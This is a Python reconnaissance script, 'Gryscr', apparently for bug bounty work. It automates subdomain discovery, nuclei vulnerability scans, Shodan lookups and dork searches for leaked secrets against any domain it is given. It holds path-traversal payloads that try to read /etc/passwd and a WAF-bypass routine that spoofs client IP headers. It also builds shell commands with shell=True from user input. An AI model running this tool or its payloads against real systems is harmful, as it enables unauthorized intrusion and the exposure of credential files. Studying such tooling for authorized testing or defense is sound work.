#!/usr/bin/env python3
"""
Gryscr v2.0 - Advanced Reconnaissance Suite with WAF Bypass
Author: Subir Sutradhar
"""

import argparse
import dns.resolver
import json
import os
import random
import re
import requests
import socket
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import urlparse, quote
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

VERSION = "2.0.0"

class Gryscr:
    def __init__(self):
        self.config = {
            'user_agents': [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                f'Gryscr/{VERSION}',
                'Googlebot/2.1 (+http://www.google.com/bot.html)',
                'Mozilla/5.0 (compatible; Bingbot/2.0)'
            ],
            'timeout': 30,
            'threads': 30,
            'dns_servers': ['1.1.1.1', '8.8.8.8', '9.9.9.9'],
            'external_tools': {
                'subfinder': 'subfinder',
                'httpx': 'httpx',
                'nuclei': 'nuclei',
                'waybackurls': 'waybackurls',
                'shodan': 'shodan',
                'ffuf': 'ffuf',
                'wafw00f': 'wafw00f'
            },
            'rate_limit': {
                'crt.sh': 2,
                'anubis': 1,
                'webarchive': 1
            },
            'proxies': None,
            'nuclei_templates': '/Users/cyborg/BugBounty/Tools/fuzzing-templates/',
            'waf_bypass_payloads': [
                '/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                '/..%2f..%2f..%2f..%2fetc/passwd',
                '/....//....//....//etc/passwd',
                '/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
                '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                '/..\\..\\..\\..\\etc\\passwd'
            ],
            'csp_headers': [
                'content-security-policy',
                'x-content-security-policy',
                'x-webkit-csp'
            ]
        }
        self.cache = {}
        self.verify_tools()

    def verify_tools(self):
        missing = []
        for tool, cmd in self.config['external_tools'].items():
            try:
                subprocess.run([cmd, '-h'], stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL, check=True)
            except:
                missing.append(tool)
        
        if missing:
            print(f"{Fore.RED}[-] Missing required tools: {', '.join(missing)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Please install them before proceeding.{Style.RESET_ALL}")
            sys.exit(1)

    def print_banner(self):
        print(f"""{Fore.RED}
   ▄████▄   ██▀███   ▄▄▄       ██████  ▄████▄   ██▀███  
  ▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒
  ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒
  ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  
  ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒
  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░
    ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░
  ░          ░░   ░   ░   ▒   ░  ░  ░  ░          ░░   ░  v2.0.0
  ░ ░         ░           ░  ░      ░  ░ ░         ░     
  ░                                  ░                   
{Style.RESET_ALL}{Fore.CYAN}
             v{VERSION} - Advanced Reconnaissance Suite
             Coder : Subir (Gray Code)
             Motivation: Riya Nair (Cyber Security Researcher)
             Description: A Passionaite coder, find more in LinkedIn & GitHub
{Style.RESET_ALL}""")

    def run_command(self, description, command, output_path=None, live_output=False):
        print(f"{Fore.GREEN}[+] {description}{Style.RESET_ALL}")
        try:
            if output_path:
                with open(output_path, 'w') as f:
                    if live_output:
                        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                        while True:
                            output = process.stdout.readline()
                            if output == '' and process.poll() is not None:
                                break
                            if output:
                                print(output.strip())
                                f.write(output)
                        stderr = process.stderr.read()
                        if stderr:
                            print(f"{Fore.YELLOW}[!] Error: {stderr.strip()}{Style.RESET_ALL}")
                    else:
                        subprocess.run(command, shell=True, check=True, stdout=f, stderr=subprocess.PIPE)
            else:
                if live_output:
                    subprocess.run(command, shell=True, check=True)
                else:
                    result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
                    if result.stdout:
                        print(result.stdout)
                    if result.stderr:
                        print(f"{Fore.YELLOW}[!] Error: {result.stderr.strip()}{Style.RESET_ALL}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Command failed: {e}{Style.RESET_ALL}")
            return False
        except Exception as e:
            print(f"{Fore.RED}[-] Unexpected error: {e}{Style.RESET_ALL}")
            return False

    def detect_waf(self, url):
        print(f"{Fore.GREEN}[+] Detecting WAF...{Style.RESET_ALL}")
        try:
            result = subprocess.run(f"wafw00f {url}", shell=True, capture_output=True, text=True)
            print(result.stdout)
            return "is protected by" in result.stdout
        except Exception as e:
            print(f"{Fore.YELLOW}[!] WAF detection failed: {e}{Style.RESET_ALL}")
            return False

    def bypass_waf(self, url):
        print(f"{Fore.GREEN}[+] Attempting WAF bypass techniques...{Style.RESET_ALL}")
        results = []
        headers = {
            'User-Agent': random.choice(self.config['user_agents']),
            'X-Forwarded-For': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1'
        }

        for payload in self.config['waf_bypass_payloads']:
            try:
                test_url = f"{url.rstrip('/')}{payload}"
                response = requests.get(test_url, headers=headers, timeout=self.config['timeout'])
                
                if response.status_code == 200 and "root:" in response.text:
                    print(f"{Fore.GREEN}[+] Potential WAF bypass: {test_url}{Style.RESET_ALL}")
                    results.append(test_url)
                elif response.status_code != 403:
                    print(f"{Fore.YELLOW}[~] Interesting response ({response.status_code}) for: {test_url}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error testing payload {payload}: {e}{Style.RESET_ALL}")

        return results

    def extract_csp_domains(self, url):
        print(f"{Fore.GREEN}[+] Checking for CSP headers...{Style.RESET_ALL}")
        domains = set()
        try:
            response = requests.get(url, timeout=self.config['timeout'])
            
            for header in self.config['csp_headers']:
                if header in response.headers:
                    csp = response.headers[header]
                    print(f"{Fore.CYAN}[*] Found {header}: {csp}{Style.RESET_ALL}")
                    found = re.findall(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', csp)
                    domains.update(found)
            
            if domains:
                print(f"{Fore.GREEN}[+] Found domains in CSP headers:{Style.RESET_ALL}")
                for domain in domains:
                    print(f"  - {domain}")
            
            return list(domains)
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error checking CSP headers: {e}{Style.RESET_ALL}")
            return []

    def full_recon(self, domain):
        output_dir = f"{domain}-recon-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
        os.makedirs(output_dir, exist_ok=True)

        print(f"{Fore.GREEN}[+] Target: {domain}{Style.RESET_ALL}")

        # WAF Detection and Bypass
        base_url = f"https://{domain}"
        if self.detect_waf(base_url):
            bypass_results = self.bypass_waf(base_url)
            with open(f"{output_dir}/waf-bypass.txt", 'w') as f:
                for result in bypass_results:
                    f.write(f"{result}\n")

        # CSP Header Analysis
        csp_domains = self.extract_csp_domains(base_url)
        if csp_domains:
            with open(f"{output_dir}/csp-domains.txt", 'w') as f:
                for domain in csp_domains:
                    f.write(f"{domain}\n")

        # Subfinder
        self.run_command("Running Subfinder...", 
                        f"subfinder -d {domain} -o {output_dir}/subdomains.txt",
                        live_output=True)

        # HTTPX
        self.run_command("Running HTTPX...",
                        f"cat {output_dir}/subdomains.txt | httpx -silent -csp-probe -json -o {output_dir}/httpx.json",
                        live_output=True)

        self.run_command("Extracting additional domains from CSP headers...",
                        f"cat {output_dir}/httpx.json | jq -r '.csp_domains[]?' | sort -u >> {output_dir}/subdomains.txt",
                        live_output=True)

        # Nuclei main scan 
        self.run_command("Running Nuclei (scanning)",
                        f"nuclei -l {output_dir}/httpx.json -o {output_dir}/nuclei-output.txt",
                        live_output=True)

        # Wayback URLs
        self.run_command("Fetching Wayback URLs...",
                        f"waybackurls {domain} | tee {output_dir}/wayback.txt",
                        live_output=True)

        # Nuclei DAST
        if os.path.exists(self.config['nuclei_templates']):
            self.run_command("Running Nuclei DAST on Wayback URLs...",
                            f"nuclei -l {output_dir}/wayback.txt -dast -t {self.config['nuclei_templates']} -o {output_dir}/dast-result.txt",
                            live_output=True)

        # Shodan search 
        self.run_command("Searching Shodan ",
                        f"shodan search \"ssl:'{domain}'\" --fields ip_str --limit 1000 > {output_dir}/shodan.txt",
                        live_output=True)

        # Nuclei on Shodan IPs
        self.run_command("Running Nuclei on Shodan IPs...",
                        f"nuclei -l {output_dir}/shodan.txt -o {output_dir}/ip-nuclei.txt",
                        live_output=True)

        # Google Dorks
        print(f"{Fore.GREEN}[+] Google Dorking Links:{Style.RESET_ALL}")
        with open(f"{output_dir}/google-dorks.txt", 'w') as f:
            dorks = [
                f"https://www.google.com/search?q=site:{domain}+ext:env+OR+ext:log+OR+ext:bak+OR+ext:sql",
                f"https://www.google.com/search?q=site:{domain}+inurl:admin+OR+inurl:login",
                f"https://www.google.com/search?q=site:{domain}+intitle:index.of"
            ]
            for dork in dorks:
                print(dork)
                f.write(dork + "\n")

        # GitHub Dorks
        print(f"{Fore.GREEN}[+] GitHub Dorking Links:{Style.RESET_ALL}")
        with open(f"{output_dir}/github-dorks.txt", 'w') as f:
            dorks = [
                f"https://github.com/search?q={domain}",
                f"https://github.com/search?q={domain}+password",
                f"https://github.com/search?q={domain}+secret",
                f"https://github.com/search?q={domain}+api_key"
            ]
            for dork in dorks:
                print(dork)
                f.write(dork + "\n")

        print(f"{Fore.GREEN}[+] Recon complete! All results in: {output_dir}{Style.RESET_ALL}")

def main():
    tool = Gryscr()
    tool.print_banner()

    parser = argparse.ArgumentParser(
        description=f"Gryscr v{VERSION}",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("-u", "--url", help="Target domain (e.g. example.com)", required=True)
    args = parser.parse_args()

    try:
        tool.full_recon(args.url)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[-] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}[-] Fatal error: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
